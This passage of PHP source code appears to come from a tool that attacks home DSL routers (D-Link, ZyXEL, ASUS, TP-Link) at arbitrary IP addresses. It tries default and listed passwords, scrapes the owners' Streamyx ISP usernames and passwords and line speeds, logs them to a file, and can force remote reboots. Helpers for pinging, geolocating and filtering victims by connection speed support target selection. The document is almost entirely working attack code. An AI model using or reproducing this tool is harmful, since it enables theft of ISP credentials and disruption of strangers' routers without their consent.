		$result .= "Streamyx Pass : ".$password[1]."\n";

	}
	if(!empty($dl_up) && !empty($dl_down)){
		$result .= "Upstream : ".trim($upstream[0])."\n";
		$result .= "Downstream : ".trim($downstream[0])."\n";
	}
	
	if($verbose){
		$result .= "Take data success ! \n";
	}
	
	if(!empty($filesave) && !empty($dl_user)){
		$data = array(
				"IP" => $ip,
				"Router" => "D-Link Streamyx",
				"Streamyx User" => $dl_user,
				"Streamyx Pass" => $dl_pass,
				"Upstream" => $dl_up,
				"Downstream" => $dl_down
				);
				
		file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
		
		foreach($data as $name => $value){
			file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
		}
		
	}
	
	return $result;
	
}

/**
 * DLink Reboot by Shahril
 * @param string $ip -> Get ip then automatically reboot the Router.
 * @return bool -> Return bool result info.
 */
function dlink_reboot($ip, $type){

	global $list;
	global $verbose;

	if($type == "SEA_1.01") { $User = "admin"; }else{ $User = "tmadmin"; }
	
	//Login into Router
	if($verbose){
		$result .= "Try to connect to DLink router with default username & password\n";
	}
	$login = curl("http://".$ip."/index.html", "username=".$User.";password=tmadmin", "username=".$User."&password=tmadmin&loginfo=on");
	
	//Using another verification
	if(strpos("auth_fail.html", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
	  foreach($list as $username => $pass){
		  $login = curl("http://".$ip."/index.html", "username=".$User.";password=".$pass, "username=".$User."&password=".$pass."&loginfo=on");
		  if(strpos("auth_fail.html", $login) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
		  }
	  }
	}
	
	//Send request to reboot Router
	if($verbose){
		echo "Authentication success ! Try to reboot that router now !\n";
	}
	$reboot = curl("http://".$ip."/rebootinfo.cgi", "username=".$User."; password=tmadmin" , "");
	if(strpos($reboot, "Please wait...")){ return true; }else{ return false; }
}

/**
 * Zyxel P-600 function by Shahril
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @return string -> Return streamyx user info.
 */
function zyxel($ip, $filesave = ""){
	
	global $list;
	global $verbose;
	
	$result = "";
	
	//Login into Router
	if($verbose){
		$result .= "Try to connect to ZyXel router with default username & password\n";
	}
	$login = curl("http://".$ip."/Forms/rpAuth_1", "", "LoginUsername=tmadmin&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5("tmadmin")."&Prestige_Login=Login", "");
	
	//Using another verification
	if(strpos("rpAuth.html", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
	  foreach($list as $username => $pass){
		  $login = curl("http://".$ip."/Forms/rpAuth_1", "", "LoginUsername=".$username."&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5($pass)."&Prestige_Login=Login", "");
		  if(!strpos("rpAuth.html", $login)){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
			}
	  }
	}
	
	// Find Username & Password
	if($verbose){
		$result .= "Authentication success ! Try to take data now !\n";
	}
	$data = curl("http://".$ip."/wzWAN_ManualCfg.html", "", "");
	$data = explode('name="wzWAN_TUserName" size="30" maxlength="70" value="', $data);
	$username = explode('" /></font>', $data[1]);
	$data = explode('name="wzWAN_TPassword" size="30" maxlength="70" value="', $username[1]);
	$password = explode('" /></td></tr><td', $data[1]);
	//
	
	//Find Upstream & Downstream
	$data1 = curl("http://".$ip."/home.html", "", "", "http://".$ip."/");
	$data1 = explode('<td>DSL</td>', $data1);
	$speed_data = explode('</td><td>', $data1[1]);
	$speed_data = explode('</td></tr>', $speed_data[1]);
	$speed_data = explode('kbps /', $speed_data[0]);
	//
	
	if(!empty($username[0]) && !empty($password[0])){
		$result .= "Streamyx User : ".$username[0]."\n";
		$result .= "Streamyx Pass : ".$password[0]."\n";
	}
	if(!empty($speed_data[0]) && !empty($speed_data[1])){
		$result .= "Upstream : ".trim(str_replace("kbps", "", $speed_data[1]))."\n";
		$result .= "Downstream : ".trim($speed_data[0])."\n";
	}
	
	if($verbose){
		$result .= "Take data success ! \n";
	}
	
	if(!empty($filesave) && !empty($username[0])){
		$data = array(
				"IP" => $ip,
				"Router" => "Zyxel P-600",
				"Streamyx User" => $username[0],
				"Streamyx Pas" => $password[0],
				"Upstream" => trim(str_replace("kbps", "", $speed_data[1])),
				"Downstream" => trim(str_replace("kbps", "", $speed_data[0]))
				);
		file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
		foreach($data as $name => $value){
			file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
		}
	}
	
	return $result;

}

/**
 * Zyxel Reboot by Shahril
 * @param string $ip -> Get ip then automatically reboot the Router.
 * @return bool -> Return bool result info.
 */
function zyxel_reboot($ip){
	
	global $list;
	global $verbose;
	
	//Login into Router
	if($verbose){
		$result .= "Try to connect to ZyXel router with default username & password\n";
	}
	$login = curl("http://".$ip."/Forms/rpAuth_1", "", "LoginUsername=tmadmin&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5("tmadmin")."&Prestige_Login=Login", "");
	
	//Using another verification
	if(strpos("rpAuth.html", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
	  foreach($list as $username => $pass){
		  $login = curl("http://".$ip."/Forms/rpAuth_1", "", "LoginUsername=".$username."&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5($pass)."&Prestige_Login=Login", "");
		  if(!strpos("rpAuth.html", $login)){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
		  }
	  }
	}
	
	if($verbose){
		echo "Authentication success ! Try to reboot that router now !\n";
	}
	$data_send = "Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5SXEyOW5rWEJ2MTJLajhoNg=="; //random data, but constant
	$data = curl("http://".$ip."/Forms/rpSysReboot_1", "", "", "", base64_decode($data_send));
	
	if(strpos($data, "RebootSuccPrev")){
		$data = curl("http://".$ip."/RebootSuccPrev.html");
		$data = curl("http://".$ip."/RebootSucc.html");
		return true;
	}else{
		return false;
	}
}

/**
 * ASUS DSL-N12U function by Shahril
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @return string -> Return streamyx user info.
 */
function asus($ip, $filesave){
	
	global $list;
	global $verbose;
	
	$result = "";

	//Login into Router and take data
	if($verbose){
		$result .= "Try to connect to Asus router with default username & password\n";
	}
	$login = curl("http://".$ip."/Edit_Advanced_DSL_WAN_Config.asp?pvcindex=0&internetpvc=1", "", "", "admin:admin");

	//Using another verification
	if(strpos("401 Unauthorized", $login)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
		foreach($list as $username => $pass){
			$login = curl("http://".$ip."/Edit_Advanced_DSL_WAN_Config.asp?pvcindex=0&internetpvc=1", "", "", $username.":".$pass);
			if(strpos("401 Unauthorized", $login) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
			}
		}
	}
	
	//Find Username & Password
	if($verbose){
		$result .= "Authentication success ! Try to take data now !\n";
	}
	$data = cutstr($login, "DSLWANList", "]];");
	$username = cutstr($data, '"0", "0", "', '"');
	$password = cutstr($data , 'streamyx", "', '"');
	
	if(!empty($username) && !empty($password)){
		$result .= "Streamyx User : ".$username."\n";
		$result .= "Streamyx Pass : ".$password."\n";
	}
	
	if($verbose){
		$result .= "Take data success ! \n";
	}
	
	if(!empty($filesave) && !empty($username)){
		$data = array(
				"IP" => $ip,
				"Router" => "ASUS DSL-N12U",
				"Streamyx User" => $username,
				"Streamyx Pass" => $password
				);
		file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
		foreach($data as $name => $value){
			file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
		}
	}
	
	return $result;
	
}

/**
 * TP-Link function by AFnuM
 * @param string $ip -> Get ip then automatically get streamyx user info.
 * @return string -> Return streamyx user info.
 */
function TpLink($ip, $filesave){

	global $list;
	global $verbose;
	
	$result = "";

	//Login into Router and take data
	if($verbose){
		$result .= "Try to connect to TpLink router with default username & password\n";
	}
	$Bukak = curl("http://".$ip."/wizard/wizardPPP.htm", "", "", "admin:admin");
	
	//Using another verification
	if(strpos("401 Unauthorized", $Bukak)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
		foreach($list as $username => $pass){
			$Bukak = curl("http://".$ip."/wizard/wizardPPP.htm", "", "", $username.":".$password);
			if(strpos("401 Unauthorized", $Bukak) === FALSE){
			if($verbose){
				$result .= "All authentication was failed!\n";
			}
			break;
			}
		}
	}
	
	//Find Username & Password
	if($verbose){
		$result .= "Authentication success ! Try to take data now !\n";
	}
	preg_match_all('/NAME="Al_PPPUsername" (.*) VALUE="(.*)">/U', $Bukak, $Username);
	preg_match_all('/NAME="Al_PPPPassword" (.*) VALUE="(.*)">/U', $Bukak, $Password);
	
	// Find DownStream & UpStream
	$data = curl("http://".$ip."/status/status_deviceinfo.htm", "", "", "admin:admin");
	$potong = cutstr($data, "Data Rate", "kbps");
	$rate = explode(" ", $potong);
	
	if(!empty($Username[2][0]) && !empty($Password[2][0])){
		$result .= "Streamyx User : ".$Username[2][0]."\n";
		$result .= "Streamyx Pass : ".$Password[2][0]."\n";
	}
	if(!empty($rate[12]) && !empty($rate[6])){
		$result .= "Upstream : ".$rate[12]."\n";
		$result .= "Downstream : ".$rate[6]."\n";
	}
	
	if($verbose){
		$result .= "Take data success ! \n";
	}
	
	if(!empty($filesave) && !empty($Username[2][0])){
		$data = array(
				"IP" => $ip,
				"Router" => "TP-Link",
				"Streamyx User" => $Username[2][0],
				"Streamyx Pass" => $Password[2][0],
				"Upstream" => $rate[11],
				"Downstream" => $rate[6]
				);
				
		file_put_contents($filesave, "\r\n\r\n", FILE_APPEND);
		
		foreach($data as $name => $value){
			file_put_contents($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
		}
	}
	
	return $result;
	
}

/**
 * TP-Link Reboot by Shahril
 * @param string $ip -> Get ip then automatically reboot the Router.
 * @return bool -> Return bool result info.
 */
function TpLink_reboot($ip){

	global $list;
	
	//Login into Router and take data
	if($verbose){
		$result .= "Try to connect to TpLink router with default username & password\n";
	}
	$Bukak = curl("http://".$ip."/wizard/wizardPPP.htm", "", "", "admin:admin");
	
	//Using another verification
	if(strpos("401 Unauthorized", $Bukak)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
		foreach($list as $username => $pass){
			$Bukak = curl("http://".$ip."/wizard/wizardPPP.htm", "", "", $username.":".$password);
			if(strpos("401 Unauthorized", $Bukak) === FALSE){ continue; }
		}
	}
	
	if($verbose){
		echo "Authentication success ! Try to reboot that router now !\n";
	}
	$reboot = curl("http://".$ip."/Forms/tools_system_1", "", "restoreFlag=0&Restart=RESTART", "admin:admin");
	$reboot_data = curl("http://".$ip."/progress.htm", "", "", "admin:admin");
	if(strpos($reboot_data, "system is restarting")){ return true; }else{ return false; }
}

/**
 * @param string $content -> Extract Cookie from HTTP Respond
 * @return string -> Return cookie from http respond string.
 */
function GetCookies($content){
	preg_match_all('/Set-Cookie: (.*);/U',$content,$temp);
	$cookie = $temp[1];
	$cookies = implode('; ',$cookie);
	return $cookies;
}

/**
 * @param string $data -> Extract downstream from provide data
 * @return integer -> Return downstream from input data
 */
function getdownstream($data){
	return cutstr($data, "Downstream : ", "\n");
}

/**
 * Function to check user limit
 *
 * @param integer $down -> Get router downstream
 * @param string $input -> Get user limit
 * @return bool -> If $down and $input is equal, then true, otherwise false
 */
function limit($down, $input){
	if(strtolower($input) == "4mb"){
		if($down > 3900){
			return true;
		}
	}elseif(strtolower($input) == "2mb"){
		if($down > 1900){
			return true;
		}
	}elseif(strtolower($input) == "8mb"){
		if($down > 7800){
			return true;
		}
	}else{
		return false;
	}
}

/**
 * Ping IP and get the time output result
 * @param string $ip -> IP that need to ping
 * @return string -> If regex success, return time otherwise return unknown string
 */
function ping($ip){
	$ping_data = shell_exec("ping -n 1 -w 50 -i 6 ".$ip);
	if(preg_match('/time\=(.*)\ \TTL/', $ping_data, $output)){
		return $output[1];
	}else{
		return $output = "Unknown!";
	}
}

/**
 * Get Location of that IP address
 * @param string $ip -> IP that need to get location
 * @return string -> Return location
 */
function get_geolocation($ip){
	$data = curl("http://www.find-ip-address.org/ip-address-locator.php", "", "scrollx=0&scrolly=300&ip=".$ip);
	preg_match_all('/\<font color\=\'#980000\'\>(.*?)\<\/font\>/', $data, $pecah_string);
	if(!empty($pecah_string[1][2]) && !empty($pecah_string[1][3])){
		if(!empty($pecah_string[1][2]) && empty($pecah_string[1][3])){
			return $pecah_string[1][2];
		}elseif(empty($pecah_string[1][2]) && !empty($pecah_string[1][3])){
			return $pecah_string[1][3];
		}elseif($pecah_string[1][2] == $pecah_string[1][3]){
			return $pecah_string[1][2];
		}else{
			return $pecah_string[1][3].", ".$pecah_string[1][2];
		}
	}else{
		return "Unknown!";
	}
}

/**
 * Get HTML Source From URL
 * @param string $url -> Set url to get html source.
 * @param string $cookie -> Send server with provide cookie.
 * @param string $post -> Send post request into server.
 * @param string $auth -> Use when you want to make http authentication (username:password)
 * @return string -> Return html code.
 */
function curl($url, $cookies = "", $post = "", $auth = ""){
	global $user_agent;
	$ch = @curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if($cookies) curl_setopt($ch, CURLOPT_COOKIE, $cookies);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	if($post){
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
	}
	if($auth){
		curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
		curl_setopt($ch, CURLOPT_USERPWD, $auth);
	}
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
	$page = curl_exec( $ch);
	curl_close($ch); 
	return $page;
}

/**
 * Cut String
 * @param string $data -> Source string you want to cut.
 * @param string $str1 -> Find string before text you want to cut.
 * @param string $str2 -> Last string after text you want to cut.
 * @return string -> Return string that have been cut.
 */
function cutstr($data, $str1, $str2){
	$data = explode($str1, $data);
	$data = explode($str2, $data[1]);
	return $data[0];
}

?>